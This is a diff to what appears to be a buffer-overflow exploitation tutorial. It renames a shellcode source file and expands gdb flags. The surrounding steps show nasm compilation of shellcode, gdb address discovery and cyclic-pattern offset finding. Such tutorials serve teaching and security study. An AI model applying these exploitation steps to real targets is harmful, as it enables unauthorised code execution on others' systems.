@@ -98,7 +98,7 @@ We express our shellcode in `.asm` as it is simpler and we'll use a script to tr
 When we generate it, we discover it's **75** bytes long *(assuming the file is kept in sync)*.
 ```sh
 $ tmpdir=$(mktemp -d);
-$ asm_payload_filepath="./data/exploit.asm";
+$ asm_payload_filepath="./data/shellcode.asm";
 # Compile the assembly program to an object file.
 $ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";
 # Link the object file into a binary.
@@ -128,7 +128,7 @@ the target through `env -i` (empty environment) with the identical `argv[0]`, so
 addresses are byte-for-byte what we'll see at runtime — no NOP sled needed.
 
 ```sh
-$ gdb -q -batch \
+$ gdb -quiet -batch \
   -ex 'set follow-fork-mode child' \
   -ex 'set exec-wrapper env -i' \
   -ex 'break main' \
@@ -149,7 +149,7 @@ We'll use this online tool to generate one: [wiremask.eu](https://wiremask.eu/to
 
 ```sh
 $ cyclic_pattern='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'; # 200 chars.
-$ printf '%s' "$cyclic_pattern" | gdb -q -batch \
+$ printf '%s' "$cyclic_pattern" | gdb -quiet -batch \
   -ex 'set follow-fork-mode child' \
   -ex 'set exec-wrapper env -i' \
   -ex 'run' \
